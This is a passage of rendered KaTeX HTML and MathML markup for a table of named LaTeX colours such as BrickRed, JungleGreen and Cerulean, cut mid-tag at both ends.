class="mord mathnormal" style="color:PineGreen;">i</span><span class="mord mathnormal" style="color:PineGreen;">n</span><span class="mord mathnormal" style="color:PineGreen;">e</span><span class="mord mathnormal" style="color:PineGreen;">G</span><span class="mord mathnormal" style="margin-right:0.02778em;color:PineGreen;">r</span><span class="mord mathnormal" style="color:PineGreen;">e</span><span class="mord mathnormal" style="color:PineGreen;">e</span><span class="mord mathnormal" style="color:PineGreen;">n</span></span></span></span></span></td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="Tan"><mi>T</mi><mi>a</mi><mi>n</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{Tan}Tan}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;color:Tan;">T</span><span class="mord mathnormal" style="color:Tan;">a</span><span class="mord mathnormal" style="color:Tan;">n</span></span></span></span></span></td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="BrickRed"><mi>B</mi><mi>r</mi><mi>i</mi><mi>c</mi><mi>k</mi><mi>R</mi><mi>e</mi><mi>d</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{BrickRed}BrickRed}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;color:BrickRed;">B</span><span class="mord mathnormal" style="margin-right:0.02778em;color:BrickRed;">r</span><span class="mord mathnormal" style="color:BrickRed;">i</span><span class="mord mathnormal" style="color:BrickRed;">c</span><span class="mord mathnormal" style="margin-right:0.03148em;color:BrickRed;">k</span><span class="mord mathnormal" style="margin-right:0.00773em;color:BrickRed;">R</span><span class="mord mathnormal" style="color:BrickRed;">e</span><span class="mord mathnormal" style="color:BrickRed;">d</span></span></span></span></span></td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="JungleGreen"><mi>J</mi><mi>u</mi><mi>n</mi><mi>g</mi><mi>l</mi><mi>e</mi><mi>G</mi><mi>r</mi><mi>e</mi><mi>e</mi><mi>n</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{JungleGreen}JungleGreen}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.09618em;color:JungleGreen;">J</span><span class="mord mathnormal" style="color:JungleGreen;">u</span><span class="mord mathnormal" style="color:JungleGreen;">n</span><span class="mord mathnormal" style="margin-right:0.03588em;color:JungleGreen;">g</span><span class="mord mathnormal" style="margin-right:0.01968em;color:JungleGreen;">l</span><span class="mord mathnormal" style="color:JungleGreen;">e</span><span class="mord mathnormal" style="color:JungleGreen;">G</span><span class="mord mathnormal" style="margin-right:0.02778em;color:JungleGreen;">r</span><span class="mord mathnormal" style="color:JungleGreen;">e</span><span class="mord mathnormal" style="color:JungleGreen;">e</span><span class="mord mathnormal" style="color:JungleGreen;">n</span></span></span></span></span></td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="Plum"><mi>P</mi><mi>l</mi><mi>u</mi><mi>m</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{Plum}Plum}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;color:Plum;">P</span><span class="mord mathnormal" style="margin-right:0.01968em;color:Plum;">l</span><span class="mord mathnormal" style="color:Plum;">u</span><span class="mord mathnormal" style="color:Plum;">m</span></span></span></span></span></td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="TealBlue"><mi>T</mi><mi>e</mi><mi>a</mi><mi>l</mi><mi>B</mi><mi>l</mi><mi>u</mi><mi>e</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{TealBlue}TealBlue}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;color:TealBlue;">T</span><span class="mord mathnormal" style="color:TealBlue;">e</span><span class="mord mathnormal" style="color:TealBlue;">a</span><span class="mord mathnormal" style="margin-right:0.01968em;color:TealBlue;">l</span><span class="mord mathnormal" style="margin-right:0.05017em;color:TealBlue;">B</span><span class="mord mathnormal" style="margin-right:0.01968em;color:TealBlue;">l</span><span class="mord mathnormal" style="color:TealBlue;">u</span><span class="mord mathnormal" style="color:TealBlue;">e</span></span></span></span></span></td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="Brown"><mi>B</mi><mi>r</mi><mi>o</mi><mi>w</mi><mi>n</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{Brown}Brown}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;color:Brown;">B</span><span class="mord mathnormal" style="margin-right:0.02778em;color:Brown;">r</span><span class="mord mathnormal" style="color:Brown;">o</span><span class="mord mathnormal" style="margin-right:0.02691em;color:Brown;">w</span><span class="mord mathnormal" style="color:Brown;">n</span></span></span></span></span></td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="Lavender"><mi>L</mi><mi>a</mi><mi>v</mi><mi>e</mi><mi>n</mi><mi>d</mi><mi>e</mi><mi>r</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{Lavender}Lavender}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="color:Lavender;">L</span><span class="mord mathnormal" style="color:Lavender;">a</span><span class="mord mathnormal" style="margin-right:0.03588em;color:Lavender;">v</span><span class="mord mathnormal" style="color:Lavender;">e</span><span class="mord mathnormal" style="color:Lavender;">n</span><span class="mord mathnormal" style="color:Lavender;">d</span><span class="mord mathnormal" style="color:Lavender;">e</span><span class="mord mathnormal" style="margin-right:0.02778em;color:Lavender;">r</span></span></span></span></span></td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="ProcessBlue"><mi>P</mi><mi>r</mi><mi>o</mi><mi>c</mi><mi>e</mi><mi>s</mi><mi>s</mi><mi>B</mi><mi>l</mi><mi>u</mi><mi>e</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{ProcessBlue}ProcessBlue}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;color:ProcessBlue;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;color:ProcessBlue;">r</span><span class="mord mathnormal" style="color:ProcessBlue;">o</span><span class="mord mathnormal" style="color:ProcessBlue;">c</span><span class="mord mathnormal" style="color:ProcessBlue;">e</span><span class="mord mathnormal" style="color:ProcessBlue;">s</span><span class="mord mathnormal" style="color:ProcessBlue;">s</span><span class="mord mathnormal" style="margin-right:0.05017em;color:ProcessBlue;">B</span><span class="mord mathnormal" style="margin-right:0.01968em;color:ProcessBlue;">l</span><span class="mord mathnormal" style="color:ProcessBlue;">u</span><span class="mord mathnormal" style="color:ProcessBlue;">e</span></span></span></span></span></td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="Thistle"><mi>T</mi><mi>h</mi><mi>i</mi><mi>s</mi><mi>t</mi><mi>l</mi><mi>e</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{Thistle}Thistle}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;color:Thistle;">T</span><span class="mord mathnormal" style="color:Thistle;">h</span><span class="mord mathnormal" style="color:Thistle;">i</span><span class="mord mathnormal" style="color:Thistle;">s</span><span class="mord mathnormal" style="color:Thistle;">t</span><span class="mord mathnormal" style="margin-right:0.01968em;color:Thistle;">l</span><span class="mord mathnormal" style="color:Thistle;">e</span></span></span></span></span></td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="BurntOrange"><mi>B</mi><mi>u</mi><mi>r</mi><mi>n</mi><mi>t</mi><mi>O</mi><mi>r</mi><mi>a</mi><mi>n</mi><mi>g</mi><mi>e</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{BurntOrange}BurntOrange}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;color:BurntOrange;">B</span><span class="mord mathnormal" style="color:BurntOrange;">u</span><span class="mord mathnormal" style="margin-right:0.02778em;color:BurntOrange;">r</span><span class="mord mathnormal" style="color:BurntOrange;">n</span><span class="mord mathnormal" style="color:BurntOrange;">t</span><span class="mord mathnormal" style="margin-right:0.02778em;color:BurntOrange;">O</span><span class="mord mathnormal" style="margin-right:0.02778em;color:BurntOrange;">r</span><span class="mord mathnormal" style="color:BurntOrange;">a</span><span class="mord mathnormal" style="color:BurntOrange;">n</span><span class="mord mathnormal" style="margin-right:0.03588em;color:BurntOrange;">g</span><span class="mord mathnormal" style="color:BurntOrange;">e</span></span></span></span></span></td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="LimeGreen"><mi>L</mi><mi>i</mi><mi>m</mi><mi>e</mi><mi>G</mi><mi>r</mi><mi>e</mi><mi>e</mi><mi>n</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{LimeGreen}LimeGreen}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="color:LimeGreen;">L</span><span class="mord mathnormal" style="color:LimeGreen;">i</span><span class="mord mathnormal" style="color:LimeGreen;">m</span><span class="mord mathnormal" style="color:LimeGreen;">e</span><span class="mord mathnormal" style="color:LimeGreen;">G</span><span class="mord mathnormal" style="margin-right:0.02778em;color:LimeGreen;">r</span><span class="mord mathnormal" style="color:LimeGreen;">e</span><span class="mord mathnormal" style="color:LimeGreen;">e</span><span class="mord mathnormal" style="color:LimeGreen;">n</span></span></span></span></span></td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="Purple"><mi>P</mi><mi>u</mi><mi>r</mi><mi>p</mi><mi>l</mi><mi>e</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{Purple}Purple}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;color:Purple;">P</span><span class="mord mathnormal" style="color:Purple;">u</span><span class="mord mathnormal" style="margin-right:0.02778em;color:Purple;">r</span><span class="mord mathnormal" style="color:Purple;">p</span><span class="mord mathnormal" style="margin-right:0.01968em;color:Purple;">l</span><span class="mord mathnormal" style="color:Purple;">e</span></span></span></span></span></td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="Turquoise"><mi>T</mi><mi>u</mi><mi>r</mi><mi>q</mi><mi>u</mi><mi>o</mi><mi>i</mi><mi>s</mi><mi>e</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{Turquoise}Turquoise}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;color:Turquoise;">T</span><span class="mord mathnormal" style="color:Turquoise;">u</span><span class="mord mathnormal" style="margin-right:0.02778em;color:Turquoise;">r</span><span class="mord mathnormal" style="margin-right:0.03588em;color:Turquoise;">q</span><span class="mord mathnormal" style="color:Turquoise;">u</span><span class="mord mathnormal" style="color:Turquoise;">o</span><span class="mord mathnormal" style="color:Turquoise;">i</span><span class="mord mathnormal" style="color:Turquoise;">s</span><span class="mord mathnormal" style="color:Turquoise;">e</span></span></span></span></span></td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="CadetBlue"><mi>C</mi><mi>a</mi><mi>d</mi><mi>e</mi><mi>t</mi><mi>B</mi><mi>l</mi><mi>u</mi><mi>e</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{CadetBlue}CadetBlue}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;color:CadetBlue;">C</span><span class="mord mathnormal" style="color:CadetBlue;">a</span><span class="mord mathnormal" style="color:CadetBlue;">d</span><span class="mord mathnormal" style="color:CadetBlue;">e</span><span class="mord mathnormal" style="color:CadetBlue;">t</span><span class="mord mathnormal" style="margin-right:0.05017em;color:CadetBlue;">B</span><span class="mord mathnormal" style="margin-right:0.01968em;color:CadetBlue;">l</span><span class="mord mathnormal" style="color:CadetBlue;">u</span><span class="mord mathnormal" style="color:CadetBlue;">e</span></span></span></span></span></td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="Magenta"><mi>M</mi><mi>a</mi><mi>g</mi><mi>e</mi><mi>n</mi><mi>t</mi><mi>a</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{Magenta}Magenta}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;color:Magenta;">M</span><span class="mord mathnormal" style="color:Magenta;">a</span><span class="mord mathnormal" style="margin-right:0.03588em;color:Magenta;">g</span><span class="mord mathnormal" style="color:Magenta;">e</span><span class="mord mathnormal" style="color:Magenta;">n</span><span class="mord mathnormal" style="color:Magenta;">t</span><span class="mord mathnormal" style="color:Magenta;">a</span></span></span></span></span></td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="RawSienna"><mi>R</mi><mi>a</mi><mi>w</mi><mi>S</mi><mi>i</mi><mi>e</mi><mi>n</mi><mi>n</mi><mi>a</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{RawSienna}RawSienna}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;color:RawSienna;">R</span><span class="mord mathnormal" style="color:RawSienna;">a</span><span class="mord mathnormal" style="margin-right:0.02691em;color:RawSienna;">w</span><span class="mord mathnormal" style="margin-right:0.05764em;color:RawSienna;">S</span><span class="mord mathnormal" style="color:RawSienna;">i</span><span class="mord mathnormal" style="color:RawSienna;">e</span><span class="mord mathnormal" style="color:RawSienna;">n</span><span class="mord mathnormal" style="color:RawSienna;">n</span><span class="mord mathnormal" style="color:RawSienna;">a</span></span></span></span></span></td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="Violet"><mi>V</mi><mi>i</mi><mi>o</mi><mi>l</mi><mi>e</mi><mi>t</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{Violet}Violet}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;color:Violet;">V</span><span class="mord mathnormal" style="color:Violet;">i</span><span class="mord mathnormal" style="color:Violet;">o</span><span class="mord mathnormal" style="margin-right:0.01968em;color:Violet;">l</span><span class="mord mathnormal" style="color:Violet;">e</span><span class="mord mathnormal" style="color:Violet;">t</span></span></span></span></span></td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="CarnationPink"><mi>C</mi><mi>a</mi><mi>r</mi><mi>n</mi><mi>a</mi><mi>t</mi><mi>i</mi><mi>o</mi><mi>n</mi><mi>P</mi><mi>i</mi><mi>n</mi><mi>k</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{CarnationPink}CarnationPink}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;color:CarnationPink;">C</span><span class="mord mathnormal" style="color:CarnationPink;">a</span><span class="mord mathnormal" style="margin-right:0.02778em;color:CarnationPink;">r</span><span class="mord mathnormal" style="color:CarnationPink;">n</span><span class="mord mathnormal" style="color:CarnationPink;">a</span><span class="mord mathnormal" style="color:CarnationPink;">t</span><span class="mord mathnormal" style="color:CarnationPink;">i</span><span class="mord mathnormal" style="color:CarnationPink;">o</span><span class="mord mathnormal" style="color:CarnationPink;">n</span><span class="mord mathnormal" style="margin-right:0.13889em;color:CarnationPink;">P</span><span class="mord mathnormal" style="color:CarnationPink;">i</span><span class="mord mathnormal" style="color:CarnationPink;">n</span><span class="mord mathnormal" style="margin-right:0.03148em;color:CarnationPink;">k</span></span></span></span></span></td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="Mahogany"><mi>M</mi><mi>a</mi><mi>h</mi><mi>o</mi><mi>g</mi><mi>a</mi><mi>n</mi><mi>y</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{Mahogany}Mahogany}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;color:Mahogany;">M</span><span class="mord mathnormal" style="color:Mahogany;">a</span><span class="mord mathnormal" style="color:Mahogany;">h</span><span class="mord mathnormal" style="color:Mahogany;">o</span><span class="mord mathnormal" style="margin-right:0.03588em;color:Mahogany;">g</span><span class="mord mathnormal" style="color:Mahogany;">a</span><span class="mord mathnormal" style="color:Mahogany;">n</span><span class="mord mathnormal" style="margin-right:0.03588em;color:Mahogany;">y</span></span></span></span></span></td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="Red"><mi>R</mi><mi>e</mi><mi>d</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{Red}Red}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;color:Red;">R</span><span class="mord mathnormal" style="color:Red;">e</span><span class="mord mathnormal" style="color:Red;">d</span></span></span></span></span></td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="VioletRed"><mi>V</mi><mi>i</mi><mi>o</mi><mi>l</mi><mi>e</mi><mi>t</mi><mi>R</mi><mi>e</mi><mi>d</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{VioletRed}VioletRed}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;color:VioletRed;">V</span><span class="mord mathnormal" style="color:VioletRed;">i</span><span class="mord mathnormal" style="color:VioletRed;">o</span><span class="mord mathnormal" style="margin-right:0.01968em;color:VioletRed;">l</span><span class="mord mathnormal" style="color:VioletRed;">e</span><span class="mord mathnormal" style="color:VioletRed;">t</span><span class="mord mathnormal" style="margin-right:0.00773em;color:VioletRed;">R</span><span class="mord mathnormal" style="color:VioletRed;">e</span><span class="mord mathnormal" style="color:VioletRed;">d</span></span></span></span></span></td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="Cerulean"><mi>C</mi><mi>e</mi><mi>r</mi><mi>u</mi><mi>l</mi><mi>e</mi><mi>a</mi><mi>n</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{Cerulean}Cerulean}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;color:Cerulean;">C</span><span class="mord mathnormal" style="color:Cerulean;">e</span><span class="mord mathnormal" style="margin-right:0.02778em;color:Cerulean;">r</span><span class="mord mathnormal" style="color:Cerulean;">u</span><span class="mord mathnormal" style="margin-right:0.01968em;color:Cerulean;">l</span><span class="mord mathnormal" style="color:Cerulean;">e</span><span class="mord mathnormal" style="color:Cerulean;">a</span><span class="mord mathnormal" style="color:Cerulean;">n</span></span></span></span></span></td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="Maroon"><mi>M</mi><mi>a</mi><mi>r</mi><mi>o</mi><mi>o</mi><mi>n</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{Maroon}Maroon}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;color:Maroon;">M</span><span class="mord mathnormal" style="color:Maroon;">a</span><span class="mord mathnormal" style="margin-right:0.02778em;color:Maroon;">r</span><span class="mord mathnormal" style="color:Maroon;">o</span><span class="mord mathnormal" style="color:Maroon;">o</span><span class="mord mathnormal" style="color:Maroon;">n</span></span></span></span></span></td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="RedOrange"><mi>R</mi><mi>e</mi><mi>d</mi><mi>O</mi><mi>r</mi><mi>a</mi><mi>n</mi><mi>g</mi><mi>e</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{RedOrange}RedOrange}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;color:RedOrange;">R</span><span class="mord mathnormal" style="color:RedOrange;">e</span><span class="mord mathnormal" style="color:RedOrange;">d</span><span class="mord mathnormal" style="margin-right:0.02778em;color:RedOrange;">O</span><span class="mord mathnormal" style="margin-right:0.02778em;color:RedOrange;">r</span><span class="mord mathnormal" style="color:RedOrange;">a</span><span class="mord mathnormal" style="color:RedOrange;">n</span><span class="mord mathnormal" style="margin-right:0.03588em;color:RedOrange;">g</span><span class="mord mathnormal" style="color:RedOrange;">e</span></span></span></span></span></td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="White"><mi>W</mi><mi>h</mi><mi>i</mi><mi>t</mi><mi>e</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{White}White}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;color:White;">W</span><span class="mord mathnormal" style="color:White;">h</span><span class="mord mathnormal" style="color:White;">i</span><span class="mord mathnormal" style="color:White;">t</span><span class="mord mathnormal" style="color:White;">e</span></span></span></span></span></td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="CornflowerBlue"><mi>C</mi><mi>o</mi><mi>r</mi><mi>n</mi><mi>f</mi><mi>l</mi><mi>o</mi><mi>w</mi><mi>e</mi><mi>r</mi><mi>B</mi><mi>l</mi><mi>u</mi><mi>e</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{CornflowerBlue}CornflowerBlue}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;color:CornflowerBlue;">C</span><span class="mord mathnormal" style="color:CornflowerBlue;">o</span><span class="mord mathnormal" style="margin-right:0.02778em;color:CornflowerBlue;">r</span><span class="mord mathnormal" style="color:CornflowerBlue;">n</span><span class="mord mathnormal" style="margin-right:0.10764em;color:CornflowerBlue;">f</span><span class="mord mathnormal" style="margin-right:0.01968em;color:CornflowerBlue;">l</span><span class="mord mathnormal" style="color:CornflowerBlue;">o</span><span class="mord mathnormal" style="margin-right:0.02691em;color:CornflowerBlue;">w</span><span class="mord mathnormal" style="color:CornflowerBlue;">e</span><span class="mord mathnormal" style="margin-right:0.02778em;color:CornflowerBlue;">r</span><span class="mord mathnormal" style="margin-right:0.05017em;color:CornflowerBlue;">B</span><span class="mord mathnormal" style="margin-right:0.01968em;color:CornflowerBlue;">l</span><span class="mord mathnormal" style="color:CornflowerBlue;">u</span><span class="mord mathnormal" style="color:CornflowerBlue;">e</span></span></span></span></span></td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="Melon"><mi>M</mi><mi>e</mi><mi>l</mi><mi>o</mi><mi>n</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{Melon}Melon}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;color:Melon;">M</span><span class="mord mathnormal" style="color:Melon;">e</span><span class="mord mathnormal" style="margin-right:0.01968em;color:Melon;">l</span><span class="mord mathnormal" style="color:Melon;">o</span><span class="mord mathnormal" style="color:Melon;">n</span></span></span></span></span></td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="RedViolet"><mi>R</mi><mi>e</mi><mi>d</mi><mi>V</mi><mi>i</mi><mi>o</mi><mi>l</mi><mi>e</mi><mi>t</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{RedViolet}RedViolet}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;color:RedViolet;">R</span><span class="mord mathnormal" style="color:RedViolet;">e</span><span class="mord mathnormal" style="color:RedViolet;">d</span><span class="mord mathnormal" style="margin-right:0.22222em;color:RedViolet;">V</span><span class="mord mathnormal" style="color:RedViolet;">i</span><span class="mord mathnormal" style="color:RedViolet;">o</span><span class="mord mathnormal" style="margin-right:0.01968em;color:RedViolet;">l</span><span class="mord mathnormal" style="color:RedViolet;">e</span><span class="mord mathnormal" style="color:RedViolet;">t</span></span></span></span></span></td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="WildStrawberry"><mi>W</mi><mi>i</mi><mi>l</mi><mi>d</mi><mi>S</mi><mi>t</mi><mi>r</mi><mi>a</mi><mi>w</mi><mi>b</mi><mi>e</mi><mi>r</mi><mi>r</mi><mi>y</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{WildStrawberry}WildStrawberry}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;color:WildStrawberry;">W</span><span class="mord mathnormal" style="color:WildStrawberry;">i</span><span class="mord mathnormal" style="margin-right:0.01968em;color:WildStrawberry;">l</span><span class="mord mathnormal" style="color:WildStrawberry;">d</span><span class="mord mathnormal" style="margin-right:0.05764em;color:WildStrawberry;">S</span><span class="mord mathnormal" style="color:WildStrawberry;">t</span><span class="mord mathnormal" style="margin-right:0.02778em;color:WildStrawberry;">r</span><span class="mord mathnormal" style="color:WildStrawberry;">a</span><span class="mord mathnormal" style="margin-right:0.02691em;color:WildStrawberry;">w</span><span class="mord mathnormal" style="color:WildStrawberry;">b</span><span class="mord mathnormal" style="color:WildStrawberry;">e</span><span class="mord mathnormal" 